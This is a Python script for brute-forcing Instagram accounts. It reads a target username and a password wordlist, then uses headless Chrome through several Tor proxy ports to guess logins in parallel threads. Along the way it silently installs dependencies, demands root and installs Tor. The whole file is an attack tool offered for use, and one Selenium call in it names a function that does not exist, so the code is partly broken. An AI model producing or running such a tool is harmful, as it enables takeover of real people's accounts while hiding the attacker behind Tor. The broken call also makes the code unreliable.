import subprocess
import sys
import os

def install_dependencies():
    libs = ["selenium", "colorama", "webdriver-manager"]
    for lib in libs:
        subprocess.check_call([sys.executable, "-m", "pip", "install", lib], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

install_dependencies()

import time
import socket
import threading
import random
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from webdriver_manager.chrome import ChromeDriverManager
from colorama import Fore, Style, init

init(autoreset=True)

TARGET_URL = "https://www.instagram.com/accounts/login/"
TOR_PORTS = [9050, 9150, 9051, 8118, 9040]
FOUND_FLAG = False

def check_root():
    if os.geteuid() != 0:
        print(Fore.RED + "Error: Root privileges required!")
        sys.exit(1)

def show_banner():
    os.system('clear')
    banner = f"""
{Fore.RED}      _________  ________  _________  ________     
{Fore.RED}     /  _/   \\ \\/ /  ___/ /__  ___/ /  ___   /    
{Fore.RED}    _/ /_/ /\\ \\/ /\\___ \\    / /    /  /__/  /     
{Fore.RED}   /____/_/  \\__/ /____/   /_/    /__/  /__/      
{Fore.WHITE}      -----------------------------------------
{Fore.WHITE}      Made by: {Fore.RED}your_name
    """
    print(banner)

def setup_tor():
    print(Fore.WHITE + "Tor service is required.")
    while True:
        choice = input(Fore.WHITE + "Install/Activate Tor? (Y/N): ").strip().upper()
        if choice == 'Y':
            os.system("apt update > /dev/null 2>&1 && apt install tor -y > /dev/null 2>&1")
            os.system("systemctl start tor > /dev/null 2>&1")
            break
        elif choice == 'N': sys.exit(0)

def check_tor_active():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        return s.connect_ex(('127.0.0.1', 9050)) == 0
    finally: s.close()

def get_driver(port):
    chrome_options = Options()
    chrome_options.add_argument(f'--proxy-server=socks5://127.0.0.1:{port}')
    chrome_options.add_argument("--headless")
    chrome_options.add_argument("--no-sandbox")
    service = Service(ChromeDriverManager().install())
    return webdriver.Chrome(service=service, options=chrome_options)

def attack(username, passwords, port):
    global FOUND_FLAG
    driver = None
    try:
        driver = get_driver(port)
        for password in passwords:
            if FOUND_FLAG: break
            driver.get(TARGET_URL)
            wait = WebDriverWait(driver, 10)
            user_input = wait.until(EC.presence_of_element_rule((By.NAME, "username")))
            pass_input = driver.find_element(By.NAME, "password")
            user_input.send_keys(username)
            pass_input.send_keys(password)
            driver.find_element(By.XPATH, "//button[@type='submit']").click()
            time.sleep(2)
            if "checkpoint" in driver.current_url or "home" in driver.current_url:
                print(f"{Fore.GREEN}[SUCCESS] Found: {password}")
                FOUND_FLAG = True
                break
    except: pass
    finally:
        if driver: driver.quit()

def main():
    check_root()
    show_banner()
    if not check_tor_active(): setup_tor()
    
    target = input("Target Username: ")
    f_name = input("Password List File: ")
    if not os.path.isfile(f_name): sys.exit(1)
    
    with open(f_name, 'r') as f:
        pwds = [l.strip() for l in f.readlines() if l.strip()]

    split = len(pwds) // len(TOR_PORTS) + 1
    threads = []
    for i, port in enumerate(TOR_PORTS):
        chunk = pwds[i*split:(i+1)*split]
        if chunk:
            t = threading.Thread(target=attack, args=(target, chunk, port))
            threads.append(t)
            t.start()

    for t in threads: t.join()

if __name__ == "__main__":
    main()
